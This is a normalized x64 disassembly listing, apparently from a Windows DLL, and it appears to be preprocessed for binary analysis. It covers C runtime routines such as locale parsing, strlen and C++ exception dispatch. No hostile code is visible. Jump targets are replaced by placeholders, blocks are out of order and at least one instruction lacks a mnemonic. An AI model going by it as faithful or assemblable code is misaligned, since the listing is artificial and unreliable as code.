lea rdx [ r--data ]
mov rcx rdi
call [ rdx + rax * 8 ]
test eax eax
je r-xdata
mov eax [ rsp + 0x44 ]
mov [ rdi + 0x8 ] eax
test r8d r8d
je r-xdata
mov rax [ rsi + rdx * 8 + 0x27c ]
mov [ rsi + rdx * 8 + 0x27c ] rcx
inc rdx
inc r8d
mov rcx rax
cmp rdx 0x5
jl r-xdata
lea rcx [ rw-data ]
cmp [ rsp + 0x58 ] rcx
je r-xdata
mov rax [ rsp + 0x58 ]
mov rcx r13
mov [ rbx + rdi + 0x48 ] rax
call sub_18002094c
mov r11d [ rsp + 0x54 ]
mov eax [ rsp + 0x50 ]
mov [ rdi + r14 * 4 ] r11d
mov [ rdi + 0x4 ] eax
jmp r-xdata
cmp r8d 0x5
jne r-xdata
movsxd rdx r8d
mov rax [ rsi + rdx * 8 + 0x27c ]
mov [ rsi + 0x27c ] rax
mov [ rsi + rdx * 8 + 0x27c ] rcx
mov eax [ rsi + rdx * 8 + 0x27c ]
cmp [ rdi + 0x4 ] eax
je r-xdata
jmp r-xdata
mov [ r13 ] 0x1
mov [ rbx + rdi + 0x58 ] r13
jmp r-xdata
mov rdx [ rbx + rdi + 0x58 ]
[ rdx ]
jne r-xdata
mov eax [ rsi + 0x280 ]
mov [ rdi + 0x108 ] eax
mov eax [ rdi + 0x14 ]
lea r12d [ r8 + 0x7a ]
mov [ rsp + 0x38 ] 0x1
mov [ rsp + 0x30 ] eax
mov eax [ rdi + 0x4 ]
lea r8 [ r--data ]
mov [ rsp + 0x28 ] eax
lea rax [ rbp ]
lea edx [ r12 - 0x7e ]
mov r9d r12d
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_18002b4b8
test eax eax
je r-xdata
mov rcx [ rbx + rdi + 0x58 ]
call sub_18002094c
shl r14 0x5
mov rcx [ r14 + rdi ]
call sub_18002094c
and [ rbx + rdi + 0x50 ] 0x0
and [ rsi + 0x280 ] 0x0
lea rax [ rbp ]
mov ecx 0x1ff
and [ rax ] cx
add rax 0x2
dec r12
jne r-xdata
mov rdx [ rw-data ]
lea rcx [ rbp ]
mov r8d 0xfe
call sub_180021520
xor ecx ecx
test eax eax
sete cl
mov [ rsi + 0x280 ] ecx
jmp r-xdata
mov eax [ rdi + 0x4 ]
mov r9d r15d
mov [ rsi + 0x27c ] eax
sub_1800238ec
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0xd0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
mov rbx r8
mov rdi rcx
test edx edx
je r-xdata
xor esi esi
lea r12d [ rsi + 0x1 ]
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
call sub_1800231c4
cmp [ r8 ] 0x4c
jne r-xdata
movsxd rax edx
shl rax 0x5
mov rax [ rax + rcx + 0x48 ]
jmp r-xdata
call sub_1800235dc
jmp r-xdata
and [ rsp + 0x28 ] esi
and [ rsp + 0x20 ] rsi
lea rdx [ rsp + 0x30 ]
xor r9d r9d
mov r8d 0x83
mov rcx rbx
call sub_1800233a0
test rax rax
je r-xdata
cmp [ r8 + 0x1 ] 0x43
jne r-xdata
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xd0
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
xor ebx ebx
lea rbp [ rdi + 0x48 ]
cmp [ r8 + 0x2 ] 0x5f
jne r-xdata
inc ebx
add rbp 0x20
cmp ebx 0x5
jle r-xdata
mov rdx [ rbp ]
lea rcx [ rsp + 0x30 ]
call sub_180025410
test eax eax
je r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_18002dc58
mov rbp rax
test rax rax
je r-xdata
test ebx ebx
je r-xdata
test r12d r12d
jne r-xdata
inc esi
lea r8 [ rsp + 0x30 ]
mov edx ebx
mov rcx rdi
call sub_1800235dc
test rax rax
jne r-xdata
xor eax eax
jmp r-xdata
mov r13 rax
sub r13 rbx
je r-xdata
mov rcx rdi
jmp r-xdata
xor r12d r12d
jmp r-xdata
cmp [ rax ] 0x3b
je r-xdata
test esi esi
je r-xdata
mov r14d 0x1
lea r12 [ r--data ]
lea rax [ r--data ]
add r12 0x18
inc r14d
cmp r12 rax
jle r-xdata
mov rcx [ r12 ]
call sub_180023ce0
cmp r13 rax
je r-xdata
mov rcx [ r12 ]
mov r8 r13
mov rdx rbx
call sub_180021890
test eax eax
jne r-xdata
inc rbp
lea rdx [ r--data ]
mov rcx rbp
call sub_18002163c
mov rbx rax
test rax rax
jne r-xdata
cmp r14d 0x5
jg r-xdata
cmp [ rbp ] 0x3b
jne r-xdata
add rbx rbp
cmp [ rbx ] 0x0
je r-xdata
lea rcx [ rsp + 0x30 ]
mov r9 rax
mov r8 rbp
mov edx 0x83
call sub_18002d168
test eax eax
jne r-xdata
inc rbx
cmp [ rbx ] 0x0
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
lea r8 [ rsp + 0x30 ]
mov edx r14d
mov rcx rdi
mov [ rsp + rbx + 0x30 ] al
call sub_1800235dc
test rax rax
je r-xdata
inc esi
sub_180023b10
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov r13 rdx
mov r12d ecx
xor esi esi
cmp ecx 0x5
jbe r-xdata
call sub_180025c90
mov rbx rax
mov [ rsp + 0x60 ] rax
call sub_180026bfc
or [ rbx + 0xc8 ] 0x10
mov edx 0x1
mov ecx 0x160
call sub_180022c90
mov rdi rax
test rax rax
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
xor eax eax
jmp r-xdata
and [ rbx + 0xc8 ] 0xffffffef
mov rax rsi
mov ecx 0xc
call sub_18002d0a8
nop
mov rdx [ rbx + 0xc0 ]
test rdx rdx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
mov ecx 0xc
call sub_18002cfa8
mov r8 r13
mov edx r12d
mov rcx rdi
call sub_1800238ec
mov rsi rax
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
cmp rdi rdx
je r-xdata
mov rcx rdi
call sub_180026984
mov rcx rdi
call sub_180026a28
nop
test r13 r13
je r-xdata
mov rcx rdi
mov r8d 0x160
call sub_1800205e0
and [ rdi ] 0x0
mov rcx rdi
call sub_1800268f8
nop
mov r12d 0x1
lea rdx [ rw-data ]
mov rcx r13
call sub_180025410
mov ecx [ rw-data ]
test eax eax
mov r12d 0x1
cmovne ecx r12d
mov [ rw-data ] ecx
jmp r-xdata
mov ecx 0xc
call sub_18002cfa8
jmp r-xdata
test [ rw-data ] r12b
jne r-xdata
mov ecx 0xc
call sub_18002d0a8
nop
mov rdx rdi
lea rcx [ rbx + 0xc0 ]
call sub_180026ba4
mov rcx rdi
call sub_180026984
test [ rbx + 0xc8 ] 0x2
jne r-xdata
mov rdx [ rbx + 0xc0 ]
lea rcx [ rw-data ]
call sub_180026ba4
mov r11 [ rw-data ]
mov rax [ r11 + 0x128 ]
mov [ rw-data ] rax
mov rax [ r11 + 0x140 ]
mov [ rw-data ] rax
mov eax [ r11 + 0x10c ]
mov [ rw-data ] eax
sub_180023ce0
mov rax rcx
neg rcx
test rax 0x7
je r-xdata
mov r8 0x7efefefefefefeff
mov r11 0x8101010101010100
nop
mov rdx [ rax ]
mov r9 r8
add rax 0x8
add r9 rdx
not rdx
xor rdx r9
and rdx r11
je r-xdata
mov rdx [ rax - 0x8 ]
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x1 ]
retn
test al 0x7
jne r-xdata
lea rax [ rcx + rax - 0x8 ]
retn
test dh dh
je r-xdata
mov dl [ rax ]
inc rax
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x7 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x6 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x5 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x4 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x3 ]
retn
shr edx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x2 ]
retn
test dh dh
jne r-xdata
sub_180023d88
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov edi ecx
call sub_180025c0c
mov rbx rax
test rax rax
jne r-xdata
cmp [ rax + 0x38 ] 0x0
jne r-xdata
lea rax [ r--data ]
mov rbx [ rbx + 0x38 ]
test edi edi
js r-xdata
mov edx 0x1
mov ecx 0x86
call sub_180022c90
mov [ rbx + 0x38 ] rax
test rax rax
je r-xdata
call sub_18002dcf4
mov edi [ rax ]
call sub_18002dcf4
cmp edi [ rax ]
jl r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
mov rax rbx
jmp r-xdata
call sub_18002dcfc
movsxd rcx edi
mov edx 0x86
mov r8 [ rax + rcx * 8 ]
mov rcx rbx
call sub_180025324
test eax eax
jne r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
sub_180023e34
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_180020498
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_180023e70
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov esi [ rcx + 0x4 ]
xor ebx ebx
mov r12 r8
mov rbp rdx
mov rdi rcx
test esi esi
je r-xdata
mov r11 rbx
movsxd rsi esi
call sub_180020a78
lea r11 [ rsi + rax ]
jmp r-xdata
mov eax 0x1
test esi esi
je r-xdata
test r11 r11
je r-xdata
mov r11 rbx
movsxd rsi [ rdi + 0x4 ]
call sub_180020a78
lea r11 [ rsi + rax ]
jmp r-xdata
test esi esi
je r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov rsi rbx
call sub_180020a78
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
mov al 0x2
test [ rbp ] al
je r-xdata
cmp [ rdi + 0x4 ] ebx
je r-xdata
call sub_180020a90
mov r11 rax
movsxd rax [ rbp + 0x4 ]
add r11 rax
cmp rsi r11
je r-xdata
test [ r12 ] 0x1
je r-xdata
test [ rdi ] 0x8
je r-xdata
mov rsi rbx
call sub_180020a78
mov rsi rax
movsxd rax [ rdi + 0x4 ]
add rsi rax
jmp r-xdata
test [ r12 ] 0x4
je r-xdata
test [ rdi ] 0x1
je r-xdata
mov eax ebx
jmp r-xdata
xor eax eax
jmp r-xdata
call sub_180020a90
lea rcx [ rsi + 0x10 ]
mov r11 rax
movsxd rax [ rbp + 0x4 ]
lea rdx [ r11 + rax + 0x10 ]
call sub_180025410
test eax eax
je r-xdata
test [ r12 ] al
je r-xdata
test [ rdi ] 0x4
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
mov ebx 0x1
test [ rdi ] al
je r-xdata
sub_180023f94
sub rsp 0x28
mov rax [ rcx ]
cmp [ rax ] 0xe0434352
je r-xdata
call sub_180025c90
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp [ rax ] 0xe0434f4d
je r-xdata
xor eax eax
add rsp 0x28
retn
call sub_180025c90
dec [ rax + 0x100 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
call sub_180025c90
and [ rax + 0x100 ] 0x0
call sub_1800260ac
sub_180023fe8
mov rax rsp
mov [ rax + 0x20 ] r9d
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r13d r9d
mov rsi r8
mov r15 rdx
mov r14 rcx
call sub_180025a80
mov edi eax
call sub_180020a78
mov [ rsp + 0x28 ] rax
call sub_180025c90
inc [ rax + 0x100 ]
call sub_180025c90
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp edi r13d
jle r-xdata
cmp edi 0xffffffff
je r-xdata
call sub_180025c90
dec [ rax + 0x100 ]
cmp edi 0xffffffff
jle r-xdata
mov r9d edi
mov r8 rsi
mov rdx r15
mov rcx r14
call sub_180025aa8
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp edi r13d
jle r-xdata
call sub_1800260d0
cmp edi [ rsi + 0x4 ]
jl r-xdata
call sub_1800260d0
movsxd r12 edi
call sub_180020a78
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
mov edi [ rcx + rax ]
mov [ rsp + 0x20 ] edi
call sub_180020a78
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_180020a78
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_180020a78
add rax rbx
jmp r-xdata
jmp r-xdata
mov r9d edi
mov r8 rsi
mov rdx r15
mov rcx r14
call sub_180025aa8
call sub_180020a78
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov [ rsp + 0x24 ] edi
jmp r-xdata
xor eax eax
call sub_180020a78
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_180020a78
add rax rbx
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
mov r8d 0x103
mov rdx r14
mov rcx rax
call sub_18002dd20
mov rcx [ rsp + 0x28 ]
call sub_180020aa8
sub_180024174
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] dl
sub rsp 0x28
cmp [ rcx ] 0xe06d7363
jne r-xdata
add rsp 0x28
mov rax [ rcx + 0x30 ]
test rax rax
je r-xdata
cmp [ rax + 0x4 ] 0x0
je r-xdata
movsxd rax [ rax + 0x4 ]
mov rdx [ rcx + 0x38 ]
add rdx rax
mov rcx [ rcx + 0x28 ]
call rdx
jmp r-xdata
sub_1800241f8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov rsi rdx
mov r14 rcx
test rdx rdx
jne r-xdata
xor edi edi
xor r12b r12b
cmp [ rdx ] edi
jle r-xdata
call sub_1800260d0
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov al r12b
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
call sub_180020a90
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
lea r13 [ r11 + rcx + 0x4 ]
call sub_180020a90
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
mov ebp [ r11 + rcx ]
test ebp ebp
jle r-xdata
inc edi
cmp edi [ rsi ]
jl r-xdata
movsxd rax edi
lea r15 [ rax + rax * 4 ]
mov r12b 0x1
dec ebp
add r13 0x4
test ebp ebp
jg r-xdata
call sub_180020a90
mov rbx rax
movsxd rax [ r13 ]
add rbx rax
call sub_180020a78
movsxd rcx [ rsi + 0x4 ]
mov r8 [ r14 + 0x30 ]
lea rax [ rax + r15 * 4 ]
mov rdx rbx
add rcx rax
call sub_180023e70
test eax eax
jne r-xdata
jmp r-xdata
sub_1800242cc
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x80
mov rdi rcx
xor r13d r13d
mov [ rsp + 0x20 ] r13d
and [ rsp + 0xc0 ] r13d
and [ rsp + 0x48 ] r13
and [ rsp + 0x40 ] r13
call sub_180025c90
mov rax [ rax + 0xf8 ]
mov [ rsp + 0xd8 ] rax
call sub_180025c90
mov rax [ rax + 0xf0 ]
mov [ rsp + 0xd0 ] rax
mov rsi [ rdi + 0x50 ]
mov [ rsp + 0xc8 ] rsi
mov rax [ rdi + 0x48 ]
mov [ rsp + 0x38 ] rax
mov rbx [ rdi + 0x40 ]
mov r15 [ rdi + 0x30 ]
mov r12 [ rdi + 0x28 ]
mov [ rsp + 0x60 ] r12
call sub_180025c90
mov [ rax + 0xf0 ] rsi
call sub_180025c90
mov [ rax + 0xf8 ] rbx
call sub_180025c90
mov rdx [ rax + 0xf0 ]
mov rdx [ rdx + 0x28 ]
lea rcx [ rsp + 0x70 ]
call sub_180020e38
mov r14 rax
mov [ rsp + 0x50 ] rax
cmp [ rdi + 0x58 ] r13
je r-xdata
mov r8d 0x100
mov rdx r12
mov rcx r15
call sub_18002dd20
mov rbx rax
mov [ rsp + 0x48 ] rax
mov rdi [ rsp + 0xd8 ]
mov r15 [ rsp + 0xd0 ]
jmp r-xdata
mov [ rsp + 0xc0 ] 0x1
call sub_180025c90
mov rcx [ rax + 0x138 ]
mov [ rsp + 0x40 ] rcx
mov rcx r14
call sub_180020eb0
test r13d r13d
jne r-xdata
call sub_180025c90
mov [ rax + 0xf0 ] r15
call sub_180025c90
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r12 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_180020e7c
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_180024174
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_1800243d1
mov [ rsp + 0x20 ] 0x1
call sub_180025c90
and [ rax + 0x2c0 ] 0x0
mov rsi [ rsp + 0xc8 ]
cmp [ rsp + 0xc0 ] 0x0
je r-xdata
lea r9 [ rsi + 0x20 ]
mov r8d [ rsi + 0x18 ]
mov edx [ rsi + 0x4 ]
mov ecx [ rsi ]
mov dl 0x1
mov rcx rsi
call sub_180024174
mov r11 [ rsp + 0x40 ]
lea r9 [ r11 + 0x20 ]
mov r8d [ r11 + 0x18 ]
mov edx [ r11 + 0x4 ]
mov ecx [ r11 ]
jmp r-xdata
call sub_180025c90
mov [ rax + 0xf0 ] r15
call sub_180025c90
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r12 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
call [ RaiseException@IAT ]
mov r13d [ rsp + 0x20 ]
mov rbx [ rsp + 0x48 ]
mov rdi [ rsp + 0xd8 ]
mov r15 [ rsp + 0xd0 ]
mov r12 [ rsp + 0x60 ]
mov r14 [ rsp + 0x50 ]
mov rcx r14
call sub_180020eb0
test r13d r13d
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_180020e7c
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_180024174
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_1800244e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov rsi r9
mov rdi r8
mov r12 rdx
mov r14 rcx
xor ebx ebx
mov r13d [ r8 + 0x4 ]
test r13d r13d
je r-xdata
mov r11 rbx
movsxd r13 r13d
call sub_180020a78
lea r11 [ r13 + rax ]
jmp r-xdata
xor eax eax
test r13d r13d
je r-xdata
test r11 r11
je r-xdata
mov r11 rbx
call sub_180020a78
mov r11 rax
movsxd rax [ rdi + 0x4 ]
add r11 rax
jmp r-xdata
cmp [ rdi + 0x8 ] ebx
jne r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov ecx [ rdi ]
test ecx ecx
js r-xdata
test [ rdi ] 0x80000000
je r-xdata
mov edi 0x1
test cl 0x8
je r-xdata
movsxd rax [ rdi + 0x8 ]
add rax [ r12 ]
mov r12 rax
test [ rsi ] dil
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_18002dd68
test eax eax
je r-xdata
cmp [ rsi + 0x18 ] ebx
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_18002dd68
test eax eax
je r-xdata
call sub_1800260d0
mov edx edi
mov rcx r12
call sub_18002dd68
test eax eax
je r-xdata
mov r11 rbx
call sub_180020a90
mov r11 rax
movsxd rax [ rsi + 0x18 ]
add r11 rax
jmp r-xdata
mov edx edi
mov rcx r12
call sub_18002dd68
test eax eax
je r-xdata
mov rcx [ r14 + 0x28 ]
mov [ r12 ] rcx
call sub_18002dd68
test eax eax
je r-xdata
call sub_18002dd68
test eax eax
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
test r11 r11
jne r-xdata
movsxd r8 [ rsi + 0x14 ]
mov rdx [ r14 + 0x28 ]
mov rcx r12
call sub_1800205e0
cmp [ rsi + 0x14 ] 0x8
jne r-xdata
mov eax ebx
jmp r-xdata
mov edx edi
mov rcx r12
call sub_18002dd68
test eax eax
je r-xdata
mov edx edi
mov rcx r12
call sub_18002dd68
test eax eax
je r-xdata
cmp [ r12 ] rbx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
cmp [ rsi + 0x18 ] ebx
je r-xdata
movsxd r10 [ rsi + 0x14 ]
lea rdx [ rsi + 0x8 ]
mov rcx [ r14 + 0x28 ]
call sub_1800241b8
mov rdx rax
mov r8 r10
mov rcx r12
call sub_1800205e0
jmp r-xdata
mov rcx [ r12 ]
jmp r-xdata
mov rcx rbx
call sub_180020a90
mov rcx rax
movsxd rax [ rsi + 0x18 ]
add rcx rax
jmp r-xdata
lea rdx [ rsi + 0x8 ]
call sub_1800241b8
mov [ r12 ] rax
jmp r-xdata
mov al [ rsi ]
and al 0x4
neg al
sbb ecx ecx
neg ecx
add ecx edi
mov ebx ecx
mov [ rsp + 0x20 ] ecx
jmp r-xdata
call sub_18002dd68
test eax eax
je r-xdata
sub_1800246e4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi rcx
test [ r8 ] 0x80000000
je r-xdata
movsxd rdi [ r8 + 0x8 ]
add rdi [ rdx ]
mov rdi rdx
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
dec eax
jne r-xdata
call sub_1800244e0
dec eax
je r-xdata
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_1800241b8
mov rdx rax
mov rcx rdi
call r10
call sub_180020a90
movsxd r10 [ rbx + 0x18 ]
add r10 rax
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_1800241b8
mov rdx rax
mov r8d 0x1
mov rcx rdi
call r10
jmp r-xdata
call sub_180020a90
mov r10 rax
movsxd rax [ rbx + 0x18 ]
add r10 rax
sub_180024794
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov r13 [ rsp + 0xa0 ]
mov rbp r9
mov r12 rdx
mov r14 r8
mov rbx rcx
lea r9 [ rax + 0x10 ]
mov r8 r13
mov rdx rbp
mov rcx r12
call sub_18002098c
mov r9 [ rsp + 0xb0 ]
mov rsi [ rsp + 0xa8 ]
mov rdi rax
test r9 r9
je r-xdata
call sub_180020a78
movsxd rcx [ rsi + 0xc ]
mov r9 rdi
add rax rcx
mov cl [ rsp + 0xc0 ]
mov r8 r14
mov [ rsp + 0x40 ] cl
mov rcx [ rsp + 0xb8 ]
mov [ rsp + 0x38 ] rbp
mov edx [ rcx ]
mov [ rsp + 0x30 ] r13
mov rcx r12
mov [ rsp + 0x28 ] edx
mov rdx rbx
mov [ rsp + 0x20 ] rax
call sub_180020f10
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov r8 rsi
mov rdx rax
mov rcx rbx
call sub_1800246e4
sub_180024858
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x60
cmp [ rcx ] 0x80000003
mov r14 r9
mov r12 r8
mov r15 rdx
mov rsi rcx
je r-xdata
mov rbx [ rsp + 0xa8 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_180025c90
mov edi [ rsp + 0xd0 ]
mov rbp [ rsp + 0xc0 ]
cmp [ rax + 0xe0 ] 0x0
je r-xdata
cmp [ rbp + 0xc ] 0x0
jne r-xdata
call sub_180025c90
mov rbx rax
call EncodePointer
cmp [ rbx + 0xe0 ] rax
je r-xdata
mov r12d [ rsp + 0xc8 ]
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xa0 ]
mov r8d edi
mov r9d r12d
mov rdx rbp
mov rcx r15
mov [ rsp + 0x20 ] rax
call sub_180020d0c
mov ecx [ rsp + 0xa0 ]
cmp ecx [ rsp + 0x50 ]
jae r-xdata
call sub_1800260d0
cmp [ rsi ] 0xe0434f4d
je r-xdata
lea rdi [ rax + 0xc ]
cmp [ rsi ] 0xe0434352
je r-xdata
inc ecx
add rdi 0x14
mov [ rsp + 0xa0 ] ecx
cmp ecx [ rsp + 0x50 ]
jb r-xdata
cmp r12d [ rdi - 0x8 ]
jg r-xdata
mov rax [ rsp + 0xd8 ]
mov r9 r14
mov r8 r12
mov [ rsp + 0x30 ] rax
mov rdx r15
mov rcx rsi
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbp
call sub_180020cb8
test eax eax
jne r-xdata
lea r13 [ rdi - 0xc ]
cmp r12d [ r13 ]
jl r-xdata
call sub_180020a78
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
xor eax eax
call sub_180020a78
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_180020a78
add rax rbx
jmp r-xdata
call sub_180020a78
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
test [ rax + rdx - 0x14 ] 0x40
jne r-xdata
call sub_180020a78
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov ecx [ rsp + 0xa0 ]
call sub_180020a78
mov ecx [ rdi ]
mov r8 [ rsp + 0xb0 ]
dec ecx
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x38 ] r13
and [ rsp + 0x30 ] 0x0
movsxd rcx ecx
mov r9 r14
lea rdx [ rcx + rcx * 4 ]
lea rcx [ rax + rdx * 4 ]
movsxd rax [ rdi + 0x4 ]
mov rdx r15
add rcx rax
mov [ rsp + 0x28 ] rcx
mov rcx rsi
mov [ rsp + 0x20 ] rbp
call sub_180024794
xor eax eax
call sub_180020a78
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_180020a78
add rax rbx
jmp r-xdata
cmp [ rax + 0x10 ] 0x0
jne r-xdata
sub_180024a90
mov rax rsp
mov [ rax + 0x20 ] rbx
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x3f ]
sub rsp 0x90
mov rbx [ rbp + 0x67 ]
mov r13 rdx
mov rdi rcx
xor r14b r14b
mov rdx r9
mov rcx rbx
mov r15 r9
mov r12 r8
